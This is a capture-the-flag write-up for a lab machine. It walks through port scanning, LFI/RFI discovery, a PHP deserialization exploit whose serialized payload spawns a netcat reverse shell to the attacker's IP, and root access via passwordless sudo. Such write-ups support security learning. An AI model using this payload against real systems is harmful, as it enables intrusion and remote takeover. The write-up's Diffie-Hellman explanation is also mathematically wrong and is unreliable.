# Stux CTF writeup

## Enumeration

Using `sudo nmap -Pn -p- -v -A 10.10.189.199` to find open ports, and which services reside at these ports.

![nmap scan](images/nmap.png)

The scan found an endpoint (`/StuxCTF/`) in the robots.txt folder. This page, however, gives us a 404 exception.


Heading back to the index of port 80 I inspect the element and find something about a secret directory.

![secret directory](images/inspect.png)

This problem immediately made me think of a discrete logarithm problem. More spesifically Diffie Hellman.
p is a public prime, and g a public generator, and a and b are Alice's and Bob's respective private keys. g^c might be a third person's g^c mod p public key.

In order to create a shared secret key using Diffie Hellman, you simply combine all peoples public keys together with your own private key like this:

shared_secret = (a_public * b_public)^(c_private) mod p = (g^a_private mod p * g^b_private mod p)^(c_private) mod p = g^(a_private*b_private*c_private) mod p

Aaaand, that's our first flag!

3. What is the hidden directory?

By inspecting the source code of this website, we're graciously given a hint to head over to `/?file=`

![hint](images/hint.png)

Typing a random argument in the `/?file=` endpoint takes us to a page that says that the file doesn't exist.

By checking for a [lfi vulnerability](https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/) (reference the directory's `index.php` file), we seem to accidentaly have discovered a new code. This code is, at least, different from the modular arithmetic code we calculated above. Using our local web server we also found out that the website has a [rfi vulernability](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/)

![lfi](images/lfi.png)

This seems an awful lot like hexadecimals, so i use an online converter to get the decoded string.

The decoded string seems to be obscured by something yet again. The double `==` at the start of this string makes it look like reversed base64.

![base64](images/base64.png)

We end up by getting the index.php file when reverting and decoding the base64 string.

![php](images/php.png)

This code may seem innocent at first (except for the inclusion of a lfi exploit), but the `unserialize` method in the last line is vulnerable for remote code execution if we're able to upload our own code to the function. [This article explains the exploit really well](https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/), but the crux of this exploit is that if we `serialize` some php code on our local machine and make the website's `unserialize` method unserialize our php code, it execute it if certain conditions are met. 

The code you want to serialize should look like this:
```php
    <?php
        class file{
            public $file = 'file.php'; // Name of the file we are making on the remote server
            public $data = '<?php shell_exec("nc -e /bin/bash 10.9.81.67 7575"); ?>'; // Spawning a bash shell and sending it to our gateway
        }
        echo (serialize(new file)); //Serialize the "file" function
    ?>
```

By serializing the php code `php inject.php > inject.php` you get a text file with the serialized data `O:4:"file":2:{s:4:"file";s:10:"remote.php";s:4:"data";s:55:"<?php shell_exec("nc -e /bin/bash 10.9.81.67 7575"); ?>";}`

Upload this file to the website through the rfi vulnerability we found earlier

![inject link](images/injectLink.png)

The file should then be saved as `file.php` in the directory.

Start up netcat `nc -lvnp 7575` and head over to the newly uploaded `file.php` to execute the file.

Connected as www-data!

We see a user named `grecia` when navigating to the home directory. 
Grecia's user.txt is located here!

## Privilege Escalation 

By running `sudo -l` we can see which (if any) commands we are able to run with escalated privileges. To my surprise all commands can be run as root without providing a password.

![Sudo](images/sudo.png)

The www-data user is naturally not allowed to access the root folder, but we may still see the content of root.txt by running `sudo cat /root/root.txt`.

Rooted! :^)
